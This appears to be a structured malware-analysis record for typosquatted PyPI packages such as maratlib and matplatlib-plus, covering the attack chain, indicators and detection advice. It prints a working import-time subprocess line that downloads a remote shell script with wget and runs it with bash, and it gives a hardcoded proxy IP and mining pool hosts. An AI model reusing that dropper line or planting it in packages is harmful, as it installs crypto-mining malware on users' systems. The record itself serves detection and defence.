package_info.package_name: maratlib, maratlib1, mplatlib, matplatlib-plus, learninglib, mllearnlib
package_info.why_malicious: These packages are typosquatting attacks that masquerade as popular libraries (e.g., matplotlib, mplotlab, learnlib, mllearn) and contain code that downloads and executes crypto-mining malware. The packages use obfuscation, proxy dependencies, and network communication to evade detection and monetize infected systems.

malicious_snippets.code_snippet:
import subprocess
subprocess.getoutput("cd /tmp && wget https://github.com/nedog123/files/raw/main/seo.sh -O gay.sh && chmod 777 gay.sh && bash gay.sh")
malicious_snippets.code_behavior: At import-time, the code downloads a remote shell script from GitHub, saves it to disk, makes it executable, and executes it, resulting in the execution of a crypto-miner payload.

malice_analysis.why_suspicious: Directly downloading and executing a remote shell script from a third-party source is a classic malware technique.
malice_analysis.violated_expectations: Legitimate packages should not execute remote code or download and run shell scripts during installation or import.
malice_analysis.similar_legitimate_use: Automated installers or updaters may download dependencies, but never arbitrary shell scripts from untrusted sources.
key_indicators: chmod and bash execution of downloaded file

execution_context.file_location: downloaded shell script (aza.sh, aza2.sh, seo.sh, gay.sh)

malicious_snippets.code_behavior: At runtime, the shell script downloads a crypto-miner binary, makes it executable, and launches it to mine cryptocurrency for the attacker's wallet.

malice_analysis.why_suspicious: Downloading and running a known crypto-miner is a clear sign of malicious activity.
malice_analysis.violated_expectations: No legitimate package should install or run crypto-mining software as a side effect.
malice_analysis.similar_legitimate_use: None; only mining software should do this, and only with user consent.
key_indicators: wget of PhoenixMiner or T-Rex miner
hardcoded mining pool and wallet address

execution_context.file_location: setup.py (obfuscated code in maratlib 1.0, matplatlib-plus, etc.)

malicious_snippets.code_behavior: At import-time, the code uses an obfuscation function to decrypt and execute additional malicious code, hiding its true behavior from static analysis.

malice_analysis.why_suspicious: Use of eval with obfuscated input is a strong indicator of code meant to evade detection and analysis.
malice_analysis.violated_expectations: Legitimate packages rarely use eval, especially with encrypted or obfuscated strings.
malice_analysis.similar_legitimate_use: Dynamic code generation in advanced frameworks, but not in simple utility libraries.
key_indicators: garbage code and misleading variable names

malicious_snippets.code_behavior: At runtime, the code randomly selects a popular website and sends an HTTP GET request, likely to check for network connectivity or evade detection by blending with normal traffic.

malice_analysis.why_suspicious: Randomly contacting popular websites is unusual for a library and may be used to test network access or evade detection.
malice_analysis.violated_expectations: Legitimate packages should not make unsolicited network requests to unrelated domains.
malice_analysis.similar_legitimate_use: Network connectivity checks in some applications, but not in utility libraries.
key_indicators: random selection and HTTP GET requests

malicious_snippets.code_snippet: SOCKS5 proxy at 23.105.226.116:2016 used for all payload downloads and miner communications
malicious_snippets.code_behavior: At import-time and runtime, all network traffic for downloading payloads and mining is routed through a hardcoded SOCKS5 proxy, hiding the attacker's infrastructure.

malice_analysis.why_suspicious: Use of a hardcoded proxy to route all traffic is a strong sign of attempts to evade detection and attribution.
malice_analysis.violated_expectations: Legitimate packages should not force all network traffic through an unknown proxy.
malice_analysis.similar_legitimate_use: Enterprise environments may use proxies, but not hardcoded in third-party packages.
key_indicators: all network traffic routed through proxy

attack_chain.action: User installs a typosquatted package (e.g., maratlib, matplatlib-plus) from PyPI.
Obfuscated Python code runs, decrypts and executes a payload using eval.
attack_chain.leads_to: Payload downloads and executes a shell script.

attack_chain.action: Python code downloads and executes a remote shell script (dropper).
attack_chain.leads_to: Shell script downloads and runs crypto-miner.

attack_chain.action: Shell script downloads and executes a crypto-miner binary, connecting to mining pools with attacker's wallet.
attack_chain.leads_to: System resources are used for unauthorized crypto-mining.

attack_chain.action: Miner and payload communications are routed through a hardcoded SOCKS5 proxy.
attack_chain.leads_to: Attacker receives mined cryptocurrency, evading detection.

attack_chain.action: Code periodically contacts popular websites to check network connectivity or blend in with normal traffic.

behavioral_signatures: Obfuscated Python code using eval and string decryption functions
Import-time or install-time execution of subprocess or shell commands
Download and execution of remote shell scripts or binaries
Unsolicited network requests to unrelated popular domains
All network traffic routed through a hardcoded proxy
file_indicators: setup.py with obfuscated code and eval usage
Presence of shell scripts named aza.sh, aza2.sh, seo.sh, gay.sh in /tmp or working directory
network_indicators: Connections to mining pools: daggerhashimoto.usa-east.nicehash.com, daggerhashimoto.eu-north.nicehash.com
HTTP requests to popular domains (reddit.com, yahoo.com, etc.) from unexpected processes
detection_knowledge.how_to_detect: Monitor for Python packages with names similar to popular libraries (edit distance analysis). Flag packages containing obfuscated code, especially those using eval and string decryption. Detect install-time or import-time execution of subprocess or shell commands that download and execute remote scripts. Watch for creation and execution of known miner binaries or suspicious shell scripts. Alert on network connections to known mining pools, hardcoded proxies, or unexpected popular domains from non-browser processes.
